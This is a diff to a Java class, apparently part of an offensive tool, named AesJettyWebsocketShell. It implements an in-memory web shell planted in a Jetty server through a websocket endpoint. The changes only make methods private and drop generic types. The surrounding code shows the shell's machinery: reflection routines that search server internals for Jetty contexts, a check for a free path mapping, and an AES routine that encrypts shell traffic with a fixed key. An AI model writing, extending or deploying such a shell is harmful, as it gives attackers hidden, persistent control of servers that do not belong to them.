@@ -48,9 +48,9 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
         this.session = session;
     }
 
-    public static Object[] getServers() throws Throwable {
+    private static Object[] getServers() throws Throwable {
         HashSet contexts = new HashSet();
-        HashSet<String> blackType = new HashSet<String>();
+        HashSet blackType = new HashSet();
         blackType.add(int.class.getName());
         blackType.add(short.class.getName());
         blackType.add(long.class.getName());
@@ -88,7 +88,7 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
         }
         return contexts.toArray();
     }
-    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
+    private static Object searchObject(String targetClassName, Object object, HashSet blacklist,HashSet blackType,int maxDepth,int currentDepth)throws Throwable {
         currentDepth++;
 
         if (currentDepth >= maxDepth){
@@ -105,14 +105,14 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
             if (!blacklist.contains(hash)) {
                 blacklist.add(new Integer(hash));
                 Field[] fields = null;
-                ArrayList<Field> fieldsArray = new ArrayList();
+                ArrayList fieldsArray = new ArrayList();
                 Class objClass = object.getClass();
                 while (objClass != null){
                     Field[] fields1 = objClass.getDeclaredFields();
                     fieldsArray.addAll(Arrays.asList(fields1));
                     objClass = objClass.getSuperclass();
                 }
-                fields = fieldsArray.toArray(new Field[0]);
+                fields = (Field[]) fieldsArray.toArray(new Field[0]);
 
 
                 for (int i = 0; i < fields.length; i++) {
@@ -152,7 +152,7 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
         return null;
 
     }
-    public static boolean canAdd(Object obj,String path) {
+    private static boolean canAdd(Object obj,String path) {
         try {
             java.lang.reflect.Method method = obj.getClass().getMethod("findMapping",new Class[]{String.class});
             if (method.invoke(obj,new Object[]{ path }) != null){
@@ -201,7 +201,7 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
         return isOk;
     }
 
-    public static Field getField(Object obj, String fieldName){
+    private static Field getField(Object obj, String fieldName){
         Class clazz = null;
 
         if(obj == null){
@@ -229,7 +229,7 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
 
         return field;
     }
-    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
         Field f=null;
         if (obj instanceof Field){
             f=(Field)obj;
@@ -241,7 +241,7 @@ public class AesJettyWebsocketShell extends Endpoint implements MessageHandler.W
         }
         return null;
     }
-    public byte[] aes(byte[] s,boolean m){
+    private byte[] aes(byte[] s,boolean m){
         try{
             javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
             c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
